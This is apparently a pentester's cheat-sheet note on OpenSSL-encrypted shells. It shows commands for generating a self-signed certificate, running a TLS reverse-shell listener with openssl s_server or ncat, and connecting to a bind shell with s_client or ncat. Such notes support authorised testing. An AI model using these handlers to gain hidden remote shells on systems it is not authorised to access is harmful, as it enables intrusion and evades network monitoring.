# OpenSSL

## 01 - Reverse Shell

- Generate TLS certificate.

```
user@pentestos:~$ openssl req -x509 -newkey rsa:4096 -days 365 -nodes -subj "/C=<country_code>/ST=<state>/L=<locality>/O=<organization_name>/OU=<organization_unit>/CN=<domain.com>/emailAddress=<email> -keyout private.key -out certificate.crt
```

- Shell handler.

```
user@pentestos:~$ openssl s_server -quiet -key private.key -cert certificate.crt -port <PORT>

user@pentestos:~$ ncat --ssl --ssl-key private.key --ssl-cert certificate.crt -lp <PORT>
```

## 02 - Bind Shell

- Shell handler

```
user@pentestos:~$ openssl s_client -quiet -connect <target_IP>:<target_PORT>

user@pentestos:~$ ncat --ssl <target_IP> <target_PORT>
```


---
## References

- [[Tactics && Techniques && Procedures (TTPs) Phases/C - Initial Access/02 - Callback Shells/OneLiners/Linux/Reverse Shells/OpenSSL|OpenSSL: Reverse Shells]]

- [[Tactics && Techniques && Procedures (TTPs) Phases/C - Initial Access/02 - Callback Shells/OneLiners/Linux/Bind Shells/OpenSSL|OpenSSL: Bind Shells]]